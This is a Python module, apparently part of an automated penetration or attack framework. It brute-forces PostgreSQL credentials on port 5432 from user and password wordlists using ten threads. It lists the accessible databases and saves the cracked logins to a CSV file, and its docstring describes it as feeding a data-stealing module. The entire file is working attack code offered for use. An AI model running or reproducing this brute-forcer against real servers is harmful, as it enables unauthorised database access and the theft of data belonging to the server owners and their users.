"""
postgres_connector.py - Brute forces PostgreSQL (port 5432) credentials and
enumerates accessible databases. Requires psycopg2-binary. Parent for steal_data_postgres.py.
"""

import os
import csv
import threading
import logging
import time
import pandas as pd
from queue import Queue
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from shared import SharedData
from logger import Logger
from actions.connector_utils import CredentialChecker

logger = Logger(name="postgres_connector.py", level=logging.DEBUG)

b_class = "PostgresBruteforce"
b_module = "postgres_connector"
b_status = "brute_force_postgres"
b_port = 5432
b_parent = None


class PostgresBruteforce:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.pg_connector = PostgresConnector(shared_data)
        logger.info("PostgresConnector initialized.")

    def bruteforce_postgres(self, ip, port):
        return self.pg_connector.run_bruteforce(ip, port)

    def execute(self, ip, port, row, status_key):
        logger.info(f"Executing PostgresBruteforce on {ip}:{port}...")
        existing_creds = CredentialChecker.check_existing_credentials(
            self.shared_data.postgresfile, ip
        )
        if existing_creds:
            if self._verify_credentials(ip, existing_creds):
                logger.success(f"Existing PostgreSQL credentials verified for {ip}")
                return 'success'
            logger.warning(f"Existing PostgreSQL credentials for {ip} no longer valid, re-bruteforcing")

        self.shared_data.ragnarorch_status = "PostgresBruteforce"
        time.sleep(2)
        success, results = self.bruteforce_postgres(ip, port)
        return 'success' if success else 'failed'

    def _verify_credentials(self, ip, credentials):
        for user, password in credentials:
            success, _ = self.pg_connector.pg_connect(ip, user, password)
            if success:
                return True
        return False


class PostgresConnector:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.load_scan_file()
        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()
        self.lock = threading.Lock()
        self.postgresfile = shared_data.postgresfile
        if not os.path.exists(self.postgresfile):
            with open(self.postgresfile, "w") as f:
                f.write("IP Address,User,Password,Port,Database\n")
        self.results = []
        self.queue = Queue()
        self.console = Console()

    def load_scan_file(self):
        try:
            data = self.shared_data.read_data()
            self.scan = pd.DataFrame(data)
            if "Ports" not in self.scan.columns:
                self.scan["Ports"] = None
        except Exception as e:
            logger.warning(f"Could not read scan data: {e}")
            self.scan = pd.DataFrame(columns=['MAC Address', 'IPs', 'Hostnames', 'Ports', 'Alive'])
        self.scan["Ports"] = self.scan["Ports"].astype(str)
        self.scan = self.scan[self.scan["Ports"].str.contains("5432", na=False)]

    def pg_connect(self, ip, user, password, port=5432):
        """Attempt to connect to PostgreSQL and list databases. Returns (success, [db_names])."""
        try:
            import psycopg2
            conn = psycopg2.connect(
                host=ip, port=port, user=user, password=password,
                dbname="postgres", connect_timeout=10
            )
            cur = conn.cursor()
            cur.execute("SELECT datname FROM pg_database WHERE datistemplate = false")
            databases = [r[0] for r in cur.fetchall()]
            cur.close()
            conn.close()
            logger.info(f"PostgreSQL login on {ip} as {user} — databases: {databases}")
            return True, databases
        except ImportError:
            logger.warning("psycopg2 not installed — run: pip install psycopg2-binary")
            return False, []
        except Exception as e:
            logger.debug(f"PostgreSQL connect failed for {ip} as {user}: {e}")
            return False, []

    def worker(self, progress, task_id, success_flag):
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                break
            ip, user, password, port = self.queue.get()
            success, databases = self.pg_connect(ip, user, password, port)
            if success:
                with self.lock:
                    for db in (databases or ["postgres"]):
                        self.results.append([ip, user, password, port, db])
                    logger.success(f"PostgreSQL credentials found for {ip}: {user}")
                    self.save_results()
                    self.remove_duplicates()
                    success_flag[0] = True
            self.queue.task_done()
            progress.update(task_id, advance=1)

    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()
        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    return False, []
                self.queue.put((adresse_ip, user, password, port))

        total = len(self.users) * len(self.passwords)
        success_flag = [False]
        threads = []
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing PostgreSQL...", total=total)
            for _ in range(10):
                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                t.start()
                threads.append(t)
            while not self.queue.empty():
                if self.shared_data.orchestrator_should_exit:
                    while not self.queue.empty():
                        self.queue.get()
                        self.queue.task_done()
                    break
            self.queue.join()
            for t in threads:
                t.join()

        return success_flag[0], self.results

    def save_results(self):
        df = pd.DataFrame(self.results, columns=['IP Address', 'User', 'Password', 'Port', 'Database'])
        df.to_csv(self.postgresfile, index=False, mode='a', header=not os.path.exists(self.postgresfile))
        self.results = []

    def remove_duplicates(self):
        df = pd.read_csv(self.postgresfile)
        df.drop_duplicates(inplace=True)
        df.to_csv(self.postgresfile, index=False)


if __name__ == "__main__":
    shared_data = SharedData()
    try:
        pg = PostgresBruteforce(shared_data)
        logger.info("Starting PostgreSQL brute force on port 5432")
        for row in shared_data.read_data():
            ip = row["IPs"]
            pg.execute(ip, b_port, row, b_status)
    except Exception as e:
        logger.error(f"Error: {e}")
